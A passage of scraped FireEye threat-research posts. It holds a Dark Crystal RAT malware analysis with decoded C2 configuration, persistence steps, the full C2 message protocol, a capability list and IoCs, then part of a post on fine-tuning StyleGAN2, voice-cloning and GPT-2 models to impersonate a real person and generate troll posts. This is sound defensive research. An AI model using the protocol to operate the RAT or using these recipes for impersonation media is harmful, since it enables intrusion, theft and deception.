to the Main method using the Assembly Explorer, we found C#-like code representing that method in Figure 5. Wherever dnSpy displays a call to another method in the code, it is possible to click on the target method name to go to it and view its code. By right-clicking on an identifier in the code, and clicking Analyze in the context menu, we caused dnSpy to look for all occurrences where the identifier is used, similar to using cross-references in IDA Pro. Figure 4: dnSpy can help us locate the sample's entry point Figure 5: dnSpy decompiles the Main method into C#-like code We went to the SchemaServerManager.Main method that is called from the entry point method, and observed that it makes many calls to ExporterServerManager.InstantiateIndexer with different integer arguments, as shown in Figure 6. We browsed to the ExporterServerManager.InstantiateIndexer method, and found that it is structured as a giant switch statement with many goto statements and labels; Figure 7 shows an excerpt. This does not look like typical dnSpy output, as dnSpy often reconstructs a close approximation of the original C# code, albeit with the loss of comments and local variable names. This code structure, combined with the fact that the code refers to the CipherMode.CBC constant, led us to believe that ExporterServerManager.InstantiateIndexer may be a decryption or deobfuscation routine. Therefore, dfsds.exe is likely obfuscated. Luckily, .NET developers often use obfuscation tools that are somewhat reversible through automated means. Figure 6: SchemaServerManager.Main makes many calls to ExporterServerManager.InstantiateIndexer Figure 7: ExporterServerManager.InstantiateIndexer looks like it may be a deobfuscation routine Deobfuscation De4dot is a .NET deobfuscator that knows how to undo many types of obfuscations. Running de4dot -d (for detect) on dfsds.exe (Figure 8) informed us that .NET Reactor was used to obfuscate it. > de4dot -d dfsds.exe de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com Latest version and source code: https://github.com/0xd4d/de4dot Detected .NET Reactor (C:\\...\\dfsds.exe) Figure 8: dfsds.exe is obfuscated with .NET Reactor After confirming that de4dot can deobfuscate dfsds.exe, we ran it again to deobfuscate the sample into the file dfsds_deob.exe (Figure 9). > de4dot -f dfsds.exe -o dfsds_deob.exe de4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.com Latest version and source code: https://github.com/0xd4d/de4dot Detected .NET Reactor (C:\\Users\\user\\Desktop\\intelfirst\\dfsds.exe) Cleaning C:\\Users\\user\\Desktop\\intelfirst\\dfsds.exe Renaming all obfuscated symbols Saving C:\\Users\\user\\Desktop\\intelfirst\\dfsds_deob.exe Figure 9: de4dot successfully deobfuscates dfsds.exe After deobfuscating dfsds.exe, we ran dnSpy again on the resulting dfsds_deob.exe. When we decompiled SchemaServerManager.Main again, the results were much different, as shown in Figure 10. Contrasting the new output with the obfuscated version shown previously in Figure 6, we found the deobfuscated code much more readable. In the deobfuscated version, all the calls to ExporterServerManager.InstantiateIndexer were removed; as suspected, it was apparently a string decoding routine. In contrast, the class names shown in the Assembly Explorer did not change; the obfuscator must have irrecoverably replaced the original class names with meaningless ones obtained from a standard list. Next, we noted that ten lines in Figure 10 hold base64-encoded data. Once the sample was successfully deobfuscated, it was time to move on to extracting its configuration and to follow the sample’s code path to its persistence capabilities and initial beacon. Figure 10: Deobfuscating dfsds.exe shows that the method begins with some path manipulation and then accesses Base64-encoded data Configuration, Persistence and Initial Beacon Recall that in Figure 10 we found that the method SchemaServerManager.Main has a local variable containing Base64-encoded data; decoding that data revealed what it contains. Figure 11 shows the decoded configuration (with C2 endpoint URLs de-fanged): > echo TUhvc3Q6aHR0cDovL2RvbWFsby5vbmxpbmUva3NlemJseGx2b3Uza2NtYnE4bDdoZjNmNGN5NXhnZW 80dWRsYTkxZHVldTNxYTU0LzQ2a3FianZ5a2x1bnAxejU2dHh6a2hlbjdnamNpM2N5eDhnZ2twdHgy NWk3NG1vNm15cXB4OWtsdnYzL2FrY2lpMjM5bXl6b24weHdqbHhxbm4zYjM0dyxCSG9zdDpodHRwOi 8vZG9tYWxvLm9ubGluZS9rc2V6Ymx4bHZvdTNrY21icThsN2hmM2Y0Y3k1eGdlbzR1ZGxhOTFkdWV1 M3FhNTQvNDZrcWJqdnlrbHVucDF6NTZ0eHpraGVuN2dqY2kzY3l4OGdna3B0eDI1aTc0bW82bXlxcH g5a2x2djMvYWtjaWkyMzlteXpvbjB4d2pseHFubjNiMzR3LE1YOkRDUl9NVVRFWC13TGNzOG8xTlZF VXRYeEo5bjl5ZixUQUc6VU5ERUY= | base64 -d MHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/ 46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjl xqnn3b34w,BHost:hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91 dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239 myzon0xwjlxqnn3b34w,MX:DCR_MUTEX-wLcs8o1NVEUtXxJ9n9yf,TAG:UNDEF Figure 11: Decoding the base64 data in SchemaServerManager.Main reveals a configuration string Figure 11 shows that the data decoded to a configuration string containing four values: MHost, BHost, MX, and TAG. We analyzed the code that parses this string and found that MHost and BHost were used as its main and backup command and control (C2) endpoints. Observe that the MHost and BHost values in Figure 11 are identical, so this sample did not have a backup C2 endpoint. In dnSpy it is possible to give classes and methods meaningful names just as it is possible to name identifiers in IDA Pro. For example, the method SchemaServerManager.StopCustomer picks the name of a random running process. By right-clicking the StopCustomer identifier and choosing Edit Method, it is possible to change the method name to PickRandomProcessName , as shown in Figure 12. Figure 12: Assigning meaningful names to methods makes it easier to keep analyzing the program Continuing to analyze the SchemaServerManager.Main method revealed that the sample persists across reboots. The persistence algorithm can be summarized as follows: The malware picks the name of a random running process, and then copies itself to %APPDATA% and C:\\ . For example, if svchost.exe is selected, then the malware copies itself to %APPDATA%\\svchost.exe and C:\\svchost.exe . The malware creates a shortcut %APPDATA%\\dotNET.lnk pointing to the copy of the malware under %APPDATA% . The malware creates a shortcut named dotNET.lnk in the logged-on user’s Startup folder pointing to %APPDATA%\\dotNET.lnk . The malware creates a shortcut C:\\Sysdll32.lnk pointing to the copy of the malware under C:\\ . The malware creates a shortcut named Sysdll32.lnk in the logged-on user’s Startup folder pointing to C:\\Sysdll32.lnk . The malware creates the registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\scrss pointing to %APPDATA%\\dotNET.lnk . The malware creates the registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wininit pointing to C:\\Sysdll32.lnk . After its persistence steps, the malware checks for multiple instances of the malware: The malware sleeps for a random interval between 5 and 7 seconds. The malware takes the MD5 hash of the still-base64-encoded configuration string, and creates the mutex whose name is the hexadecimal representation of that hash. For this sample, the malware creates the mutex bc2dc004028c4f0303f5e49984983352 . If this fails because another instance is running, the malware exits. The malware then beacons, which also allows it to determine whether to use the main host (MHost) or backup host (BHost). To do so, the malware constructs a beacon URL based on the MHost URL, makes a request to the beacon URL, and then checks to see if the server responds with the HTTP response body “ok.” If the server does not send this response, then the malware unconditionally uses the BHost; this code is shown in Figure 13. Note that since this sample has the same MHost and BHost value (from Figure 11), the malware uses the same C2 endpoint regardless of whether the check succeeds or fails. Figure 13: The malware makes an HTTP request based on the MHost URL to determine whether to use the MHost or BHost The full algorithm to obtain the beacon URL is as follows: Obtain the MHost URL, i.e., hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54 /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239my zon0xwjlxqnn3b34w . Calculate the SHA1 hash of the full MHost URL, i.e., 56743785cf97084d3a49a8bf0956f2c744a4a3e0. Remove the last path component from the MHost URL, and then append the SHA1 hash from above, and ?data=active. The full beacon URL is therefore hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54 /46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf 97084d3a49a8bf0956f2c744a4a3e0.php?data=active . After beaconing the malware proceeds to send and receive messages with the configured C2. Messages and Capabilities After performing static analysis of dfsds.exe to determine how it selects the C2 endpoint and confirming the C2 endpoint URL, we shifted to dynamic analysis in order to collect sample C2 traffic and make it easier to understand the code that generates and accepts C2 messages. Luckily for our analysis, the malware continues to generate requests to the C2 endpoint even if the server does not send a valid response. To listen for and intercept requests to the C2 endpoint (domalo[.]online) without allowing the malware Internet access, we used FLARE’s FakeNet-NG tool . Figure 14 shows some of the C2 requests that the malware made being captured by FakeNet-NG. Figure 14: FakeNet-NG can capture the malware's HTTP requests to the C2 endpoint By comparing the messages generated by the malware and captured in FakeNet-NG with the malware’s decompiled code, we determined its message format and types. Observe that the last HTTP request visible in Figure 14 contains a list of running processes. By tracing through the decompiled code, we found that the method SchemaServerManager.ObserverWatcher.NewMerchant generated this message. We renamed this method to taskThread and assigned meaningful names to the other methods it calls; the resulting code for this method appears in Figure 15. Figure 15: The method that generates the list of running processes and sends it to the C2 endpoint By analyzing the code further, we identified the components of the URLs that the malware used to send data to the C2 endpoint, and how they are constructed. Beacons The first type of URL is a beacon, sent only once when the malware starts up. For this sample, the beacon URL was always hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzk hen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/<hash>.php?data=active, where <hash> is the SHA1 hash of the MHost URL, as described earlier. GET requests, format 1 When the malware needs to send data to or receive data from the C2, it sends a message. The first type of message, which we denote as “format 1,” is a GET request to URLs of the form hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn 3b34w/ <hash> .php? type=__ds_setdata&__ds_setdata_user= <user_hash> &__ds_setdata_ext= <message_hash> &__ds_setdata_data= <message> , where: <hash> is MD5(SHA1(MHost)) , which for this sample, is 212bad81b4208a2b412dfca05f1d9fa7 . <user_hash> is a unique identifier for the machine on which the malware is running. It is always calculated as SHA1(OS_version + machine_name + user_name) as provided by the .NET System.Environment class. <message_hash> identifies what kind of message the malware is sending to the C2 endpoint. The <message_hash> is calculated as MD5(<message_type> + <user_hash>) , where <message_type> is a short keyword identifying the type of message, and <user_hash> is as calculated above. Values for <message_type> exist for each command that the malware supports; for possible values, see the “msgs” variable in the code sample shown in Figure 19. Observe that this makes it difficult to observe the message type visually from log traffic, or to write a static network signature for the message type, since it varies for every machine due to the inclusion of the <user_hash> . One type of message uses the value u instead of a hash for <message_hash> . <message> is the message data, which is not obscured in any way. The other type of ordinary message is a getdata message. These are GET requests to URLs of the form hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn 3b34w/ <hash> .php? type=__ds_getdata&__ds_getdata_user= <user_hash> &__ds_getdata_ext= <message_hash> &__ds_getdata_key= <key> , where: <hash> and <user_hash> are calculated as described above for getdata messages. <message_hash> is also calculated as described above for getdata messages, but describes the type of message the malware is expecting to receive in the server’s response. <key> is MD5(<user_hash>) . The server is expected to respond to a getdata message with an appropriate response for the type of message specified by <message_hash> . GET requests, format 2 A few types of messages from the malware to the C2 use a different format, which we denote as “format 2.” These messages are GET requests of the form hxxp://domalo[.]online /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gj ci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/ <user_hash> . <mes sage_hash> , where: <user_hash> is calculated as described above for getdata messages. <message_hash> is also calculated as described above for getdata messages, but describes the type of message the malware is expecting to receive in the server’s response. <message_hash> may also be the string comm . Table 1 shows possible <message_types> that may be incorporated into <message_hash> as part of format 2 messages to instruct the server which type of response is desired. In contrast to format 1 messages, format 2 messages are only used for a handful of <message_type> values. <message_type> Response desired s_comm The server sends a non-empty response if a screenshot request is pending m_comm The server sends a non-empty response if a microphone request is pending RDK The server responds directly with keystrokes to replay comm The server responds directly with other types of tasking Table 1: Message types when the malware uses a special message to request tasking from the server POST requests When the malware needs to upload large files, it makes a POST request. These POST requests are sent to hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn 3b34w/<hash>.php , with the following parameters in the POST data: name is <user_hash> + \".\" + <message_type> , where <user_hash> is calculated as described above and <message_type> is the type of data being uploaded. upload is a file with the data being sent to the server. Table 2 shows possible <message_type> values along with the type of file being uploaded. <message_type> Type of File jpg Screenshot zipstealerlog Cookie stealer log wav Microphone recording file Uploaded file bmp Webcam image RD.jpg Remote control screenshot Table 2: Message types when files are uploaded to the server Capabilities By analyzing the code that handles the responses to the comm message (format 2), it was possible for us to inventory the malware’s capabilities. Table 3 shows the keywords used in responses along with the description of each capability. Keyword Description shell Execute a shell command deleteall Recursively delete all files from C:, D:, F:, and G: closecd Close the CD-ROM drive door setwallpaper Change the background wallpaper ddos Send TCP and UDP packets to a given host or IP address logoff Log off the current user keyboardrecorder Replay keystrokes as if the user had typed them fm_newfolder Create a new folder fm_rename Rename or move a file desktopHide Hide desktop icons keyloggerstart Start logging keystrokes exec_cs_code Compile and execute C# code msgbox Open a Windows MessageBox fm_upload Transfer a file from the C2 to the client rdp Re-spawn the malware running as an administrator fm_zip Build a ZIP file from a directory tree and transfer it from the client to the C2 webcam Take a webcam picture fm_unzip Unzip a ZIP file to a given path on the client keyloggerstop Stop logging keystrokes fm_drives Enumerate drive letters cookiestealer Transfer cookies and browser/FileZilla saved credentials to the C2 fm_delete Recursively delete a given directory dismon Hide desktop icons and taskbar fm_uploadu Transfer a file from the C2 to the client taskstart Start a process cleardesktop Rotate screen lcmd Run shell command and send standard output back to C2 taskbarShow Show taskbar clipboard Set clipboard contents cookiestealer_file Save cookies and credentials to a local file newuserpass Create a new local user account beep Beep for set frequency and duration speak Use speech synthesizer to speak text openchat Open chat window taskbarHide Hide the taskbar RDStart Start remote control over user’s desktop closechat Close chat window RDStop Stop remote control over user’s desktop fm_opendir List directory contents uninstall Remove the malware from the client taskkill Kill a process forkbomb Endlessly spawn instances of cmd.exe fm_get Transfer a file from the client to the C2 desktopShow Show desktop icons Clipboardget Transfer clipboard contents to C2 playaudiourl Play a sound file opencd Open the CD-ROM drive door shutdown Shut down the machine restart Restart the machine browseurl Open a web URL in the default browser Table 3: Capabilities of DCRat Proof-of-Concept Dark Crystal RAT Server After gathering information from Dark Crystal RAT about its capabilities and C2 message format, another way to illustrate the capabilities and test our understanding of the messages was to write a proof-of-concept server. Here is a code snippet that we wrote containing a barebones DCRat server written in Python . Unlike a real RAT server, this one does not have a user interface to allow the attacker to pick and launch commands. Instead, it has a pre-scripted command list that it sends to the RAT. When the server starts up, it uses the Python BaseHTTPServer to begin listening for incoming web requests (lines 166-174). Incoming POST requests are assumed to hold a file that the RAT is uploading to the server; this server assumes all file uploads are screenshots and saves them to “screen.png” (lines 140-155). For GET requests, the server must distinguish between beacons, ordinary messages, and special messages (lines 123-138). For ordinary messages, __ds_setdata messages are simply printed to standard output, while the only __ds_getdata message type supported is s_comm (screenshot communications), to which the server responds with the desired screenshot dimensions (lines 63-84). For messages of type comm, the server sends four types of commands in sequence: first, it hides the desktop icons; then, it causes the string “Hello this is tech support” to be spoken; next, it displays a message box asking for a password; finally, it launches the Windows Calculator (lines 86-121). Figure 16 shows the results when Dark Crystal RAT is run on a system that has been configured to redirect all traffic to domalo[.]online to the proof-of-concept server we wrote. Figure 16: The results when a Dark Crystal RAT instance communicates with the proof-of-concept server Other Work and Reconnaissance After reverse engineering Dark Crystal RAT, we continued reconnaissance to see what additional information we could find. One limitation to our analysis was that we did not wish to allow the sample to communicate with the real C2, so we kept it isolated from the Internet. To learn more about Dark Crystal RAT we tried two approaches: the first was to browse the Dark Crystal RAT website (files.dcrat[.]ru) using Tor, and the other was to take a look at YouTube videos of others’ experiments with the “real” Dark Crystal RAT server. Dark Crystal RAT Website We found that Dark Crystal RAT has a website at files.dcrat[.]ru, shown in Figure 17. Observe that there are options to download the RAT itself, as well as a few plugins; the DCLIB extension is consistent with the plugin loading code we found in the RAT. Figure 17: The website files.dcrat[.]ru allows users to download Dark Crystal RAT and some of its plugins Figure 18 shows some additional plugins, including plugins with the ability to resist running in a virtual machine, disable Windows Defender, and disable webcam lights on certain models. No plugins were bundled with the sample we studied. Figure 18: Additional plugins listed on the Dark Crystal RAT website Figure 19 lists software downloads on the RAT page. We took some time to look at these files; here are some interesting things we discovered: The DCRat listed on the website is actually a “builder” that packages a build of the RAT and a configuration for the attacker to deploy. This is consistent with the name DCRatBuild.exe shown back in Figure 4. In our brief testing of the builder, we found that it had a licensing check. We did not pursue bypassing it once we found public YouTube videos of the DCRat builder in operation, as we show later. The DarkCrystalServer is not self-contained, rather, it is just a PHP file that allows the user to supply a username and password, which causes it to download and install the server software. Due to the need to supply credentials and communicate back with dcrat[.]ru (Figure 20), we did not pursue further analysis of DarkCrystalServer. Figure 19: The RAT page lists software for the RAT, the server, an API, and plugin development Figure 20: The DarkCrystalServer asks for a username and password and calls back to dcrat[.]ru to download software, so we did not pursue it further YouTube Videos As part of confirming our findings about Dark Crystal RAT capabilities that we obtained through reverse engineering, we found some YouTube demonstrations of the DCRat builder and server. The YouTube user LIKAR has a YouTube demonstration of Dark Crystal RAT . The author demonstrates use of the Dark Crystal RAT software on a server with two active RAT instances. During the video, the author browses through the various screens in the software. This made it easy to envision how a cyber threat would use the RAT, and to confirm our suspicions of how it works. Figure 21 shows a capture from the video at 3:27 . Note that the Dark Crystal RAT builder software refers to the DCRatBuild package as a “server” rather than a client. Nonetheless, observe that one of the options was a type of Java, or C# (Beta). By watching this YouTube video and doing some additional background research, we discovered that Dark Crystal RAT has existed for some time in a Java version. The C# version is relatively new. This explained why we could not find much detailed prior reporting about it. Figure 21: A YouTube demonstration revealed that Dark Crystal RAT previously existed in a Java version, and the C# version we analyzed is in beta Figure 22 shows another capture from the video at 6:28. The functionality displayed on the screen lines up nicely with the “msgbox”, “browseurl”, “clipboard”, “speak”, “opencd”, “closecd”, and other capabilities we discovered and enumerated in Table 6. Figure 22: A YouTube demonstration confirmed many of the Dark Crystal RAT capabilities we found in reverse engineering Conclusion In this post we walked through our analysis of the sample that the threat intel team provided to us and all its components. Through our initial triage, we found that its “dfsds.exe” component is Dark Crystal RAT. We found that Dark Crystal RAT was a .NET executable, and reverse engineered it. We extracted the malware’s configuration, and through dynamic analysis discovered the syntax of its C2 communications. We implemented a small proof-of-concept server to test the correct format of commands that can be sent to the malware, and how to interpret its uploaded screenshots. Finally, we took a second look at how actual threat actors would download and use Dark Crystal RAT. To conclude, indicators of compromise for this version of Dark Crystal RAT (MD5: 047af34af65efd5c6ee38eb7ad100a01) are given in Table 4. Indicators of Compromise Dark Crystal RAT (dfsds.exe) Handle artifacts Mutex name bc2dc004028c4f0303f5e49984983352 Registry artifacts Registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\scrss Registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wininit File system artifacts File C:\\Sysdll32.lnk File %APPDATA%\\dotNET.lnk File Start Menu\\Programs\\Startup\\Sysdll32.lnk File Start Menu\\Programs\\Startup\\dotNET.lnk File %APPDATA%\\<random process name>.exe File C:\\<random process name>.exe Network artifacts HTTP request hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91due u3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9kl vv3/212bad81b4208a2b412dfca05f1d9fa7.php?data=active HTTP request hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91due u3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9kl vv3/akcii239myzon0xwjlxqnn3b34w212bad81b4208a2b412dfca05f1d9f a7.php? type=__ds_getdata&__ds_getdata_user=<user_hash>&__ds_getdata_ex t=<message_hash>&__ds_getdata_key=<key> HTTP request hxxp://domalo[.]online /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp 1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xw jlxqnn3b34w/<user_hash>.<message_hash> TCP connection domalo[.]online:80 TCP connection ipinfo[.]ip DNS lookup domalo[.]online DNS lookup ipinfo[.]ip Strings Static string DCRatBuild Table 4: IoCs for this instance of DCRat FireEye Product Support for Dark Crystal RAT Table 5 describes how FireEye products react to the initial sample (MD5: b478d340a787b85e086cc951d0696cb1) and its Dark Crystal RAT payload, or in the case of Mandiant Security Validation, allow a stakeholder to validate their own capability to detect Dark Crystal RAT. FireEye Product Support for Dark Crystal RAT FireEye Network Security (NX) Backdoor.Plurox detection FireEye Email Security (EX & ETP) Backdoor.MSIL.DarkCrystal, Backdoor.Plurox, Malware.Binary.exe, Trojan.Vasal.FEC3, Win.Ransomware.Cerber-6267996-1, fe_ml_heuristic detections FireEye Endpoint Security (HX) Trojan.GenericKD.32546165, Backdoor.MSIL.DarkCrystal detections FireEye Malware Analysis (AX) Backdoor.Plurox.FEC2 detection FireEye Detection on Demand (DoD) Backdoor.Plurox.FEC2, FireEye.Malware detections Mandiant Security Validation Built-in Action coming soon Table 5: Support in FireEye products to detect Dark Crystal RAT or validate detection capability Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/08/repurposing-neural-networks-to-generate-synthetic-media-for-information-operations.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-08-05",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye’s Data Science and Information Operations Analysis teams released this blog post to coincide with our Black Hat USA 2020 Briefing , which details how open source, pre-trained neural networks can be leveraged to generate synthetic media for malicious purposes. To summarize our presentation, we first demonstrate three successive proof of concepts for how machine learning models can be fine-tuned in order to generate customizable synthetic media in the text, image, and audio domains. Next, we illustrate examples in which synthetically generated media have been weaponized for information operations (IO), as detected on the front lines by Mandiant Threat Intelligence. Finally, we outline challenges in detecting synthetically generated content, and lay out potential paths forward in a future where synthetically generated media will increasingly look, speak, and write like us. Highlights Open source, pre-trained natural language processing, computer vision, and speech recognition neural networks can be weaponized for offensive social media-driven IO campaigns. Detection, attribution, and response is challenging in scenarios where actors can anonymously generate and distribute credible fake content using proprietary training datasets. The security community can and should help AI researchers, policy makers, and other stakeholders mitigate the harmful use of open source models. Background: Synthetic Media, Generative Models, and Transfer Learning Synthetic media is by no means a new development; methods for manipulating media for specific agendas are as old as the media themselves. In the 1930’s, the chief of the Soviet secret police was photographed walking alongside Joseph Stalin before being retouched out of an official press photo, after he himself was arrested and executed during the Great Purge . Digital graphic manipulation like this became prominent with the advent of Photoshop. Then later in the 2010’s, the term “deepfake” was coined. While deepfake videos, including techniques like face swapping and lip syncing, are concerning in the long term, this blog post focuses on more basic, but we argue more believable, synthetic media generation advancements in the text, static image, and audio domains. Machine learning approaches for creating synthetic media are underpinned by generative models, which have been effectively misused to fabricate high volume submissions to federal public comment websites and clone a voice to trick an executive into handing over $240,000 . The pre-training required to produce models capable of synthetic media generation can cost thousands of dollars, take weeks or months of time, and require access to expensive GPU clusters. However, the application of transfer learning can drastically reduce the amount of time and effort involved. In transfer learning, we start from a large generic model that has been pre-trained for an initial task where copious data is available. We then leverage the model’s acquired knowledge to train it further on a different, smaller dataset so that it excels at a subsequent, related task. This process of training the model further is referred to as fine-tuning , which typically requires less resources compared to pre-training from scratch. You can think of this in more relatable terms—if you’re a professional tennis player, you don’t need to completely relearn how to swing a racket in order to excel at badminton. In practice though, the benefits of transfer learning are only\nrealized when people share their pre-trained models. As illustrated by\nFigure 1, it turns out that it’s commonplace for well-resourced\nindustry and academic researchers to release their model checkpoints\nwhen their state of the art (SOTA) work gets accepted into a top-tier\nconference. Code is typically released in the form of GitHub\nrepositories with extensive HOWTO guides and well-documented READMEs.\nThis allows anyone to easily reproduce figures from the initial\npapers, and potentially use this source code as a starting point for\ntheir own research or projects. This process plays out on loop,\nensuring a healthy, self-reinforcing model supply chain and ultimately\na quicker pace of scientific innovation. However, while this emergent\nmodel sharing ecosystem beneficially lowers the barrier to entry for\nnon-experts, it also gives a leg up to those seeking to leverage open\nsource models for malicious purposes. Just how much has this barrier to entry been lowered though?\nFine-tuning can be performed in a fraction of the time, cost, data\nsize, and compute compared to training models from scratch. Whether\nit's a cloud hosted notebook with GPU access, or a cloud GPU instance\nreservation for just a single day, we're talking on the order of just\ntens of dollars to fine-tune one of these models. Skill-wise,\nfine-tuning is not necessarily trivial, but it’s also not “brain\nsurgery”—authors or other open source contributors often release\nadditional code and tutorials for how to fine-tune. The pre-trained models covered here were each released just within\nthe last year, so the demonstrations in the next section should be\nseen through the lens of the present moment in time. However, open\nsource releases are accelerating, and the bar for generating credible\nsynthetic content will likely lower even further in the years to come. See No Evil As a first proof of concept, we’ll demonstrate how StyleGAN2 can be\nfine-tuned in order to generate custom portraits to impersonate a\ntarget individual. StyleGAN2, like its\npredecessor StyleGAN, is architected as a generative adversarial\nneural network (or GAN) . GANs consist of 2 underlying networks\nthat are pitted against each other (hence “adversarial”) - a\ngenerator, which generates new instances of data, and a discriminator,\nwhich evaluates these instances for authenticity by deciding whether\neach one belongs to the actual training dataset or not. If you\ngenerate images from pre-trained StyleGAN2 off-the-shelf, it outputs random,\nhigh quality, and highly diverse images that appear in a similar\norientation as the images that it was pre-trained on . These\nimages are not present in StyleGAN2’s original training set, but are\ncompletely fabricated from the generative model—these people in fact\ndo not exist, and never have. StyleGAN2 can also be fine-tuned on private datasets to generate\noutputs for custom tasks that the user of the open source model can\ncontrol. As illustrated in Figure 2, we downloaded a few hundred\nimages of Tom Hanks from online image search services, cropped them so\nthat they were each face-centered and 512x512 pixels as required by\nthe pre-trained model, and simply continued training StyleGAN2 by\npointing it at this new smaller dataset using a slightly smaller\nlearning rate. After less than a day of fine-tuning on a single GPU,\nwe then used the fine-tuned StyleGAN2 model to generate arbitrarily\nmany fake images of Mr. Hanks, which exhibit a high level of\nresemblance to his authentic online images. In theory, we could\ncollect cropped images from any target of our choosing and perform the\nsame exercise to generate arbitrarily many fake images of them. Hear No Evil As a second proof of concept, we’ll switch to the audio domain where\nwe demonstrate how SV2TTS can be fine-tuned on audio samples in order\nto impersonate the voice of a target individual. SV2TTS is a complex,\n3-stage model that can perform Voice Cloning —or text-to-speech from arbitrary text inputs to captured reference\nspeech in real time. SV2TTS is comprised of three underlying neural\nnetworks – first, the speaker encoder is trained on thousands of\nspeakers in order to learn an abstract representation of human speech\nand squeeze it into a compressed embedding of floating point values.\nThen the Synthesizer, which\nis based on Google’s TacoTron2 , takes text as input and returns\na mel spectrogram , a\nnumerical representation of an individual’s voice. Lastly, the\nvocoder, based\non DeepMind’s WaveNet , takes the mel spectrogram and converts it\ninto an output waveform that can be heard and comprehended. While pre-trained SV2TTS can be used to generate speech using\narbitrary text from one of a few hundred or so voices, as shown in\nFigure 3 it can also be fine-tuned to generate speech in an\narbitrary voice using arbitrary text. All we need to do is\ncollect some audio samples, which are freely available to record via\nthe Internet, load up a few of the resulting M4A files into the\npre-trained SV2TTS model, and use it as a feature extractor to\nsynthesize new speech waveforms. Using Mr. Hanks again as an example,\nwe demonstrate the result of this process on a few pieces of input\ntext that were chosen by us to resemble cell-phone quality commentary\nthat is thematically representative of the types of narratives we see\npushed in IO campaigns. While the specific examples here are somewhat\nrobotic and show signs of inauthenticity, the timbre of the voice is\n(in our subjective view) similar to that of Mr. Hanks. Neither the\ntext nor the voices exist in any of the original SVT2TTS training\ndatasets. It's worth noting that we didn’t even need a GPU to do this\n– the pre-trained model was fine-tuned locally using a basic laptop’s\nCPU cores, which also suggests that quality improvements are possible\nwith greater resourcing. Speak No Evil Our last proof of concept is in the text domain, where we\ndemonstrate how GPT-2 can be fine-tuned in order to generate custom\nsocial media posts reflecting narratives pushed in a social media IO\ncampaign. GPT-2 is an open source\nneural network that was trained on the causal language modeling\ntask , whose objective is to predict the next word in a sentence\nfrom previous context. A pre-trained model ends up being capable of\nlanguage generation: if the model can predict the next word\naccurately, it can be used in turn to predict the following word, and\nthen so on and so forth until eventually, the model produces fully\ncoherent sentences and paragraphs. The pre-trained GPT-2 model’s outputs display relatively formal\ngrammar, punctuation, and structure that corresponds to the text\npresent within their original prosaic dataset. To make GPT-2's\ngenerations appear more like posts we might expect to encounter\nscrolling through social media, with their shorter length, informal\ngrammar, erratic punctuation, and syntactic quirks, we fine-tuned it\non a new language modeling task using additional training data. This\ndata consisted of open source social media posts from accounts\noperated by Russia’s famed Internet Research Agency or IRA “troll\nfactory.” We fine-tuned GPT-2 on a single GPU for a few hours by processing\nthese social media posts through the pre-trained model , whose\nactivations were then fed through adjustable weights into a linear\noutput layer. The resulting fake posts are short yet biting, express\noutrage regarding political issues, and contain idiosyncrasies like\nhashtags and emojis that positionally manifest at the end of the\ngenerated text. Synthetic Media in the Wild IO actors use various tactics that would be readily conducive to\nsynthetic media augmentation. For example, one influence campaign we\nuncovered and dubbed \"Distinguished\nImpersonator\" involves falsifying journalist personas and\nreaching out to real-world experts and political figures to\ndisingenuously solicit audio and video interviews that advance an\nIranian political agenda. Another commonly used tactic is the\ndevelopment of cross-platform online personas that are used to\ninfiltrate target groups or disseminate fabricated content to specific\naudiences, such as in the \"Ghostwriter\"\ncampaign that has leveraged website compromises and used multiple\nwell-developed personas to disseminate fabricated content\naligned with Russian security interests. And other very common\ntechniques include the use of appropriated photos of real individuals\nto backstop false personas, and the repeated use of identical text 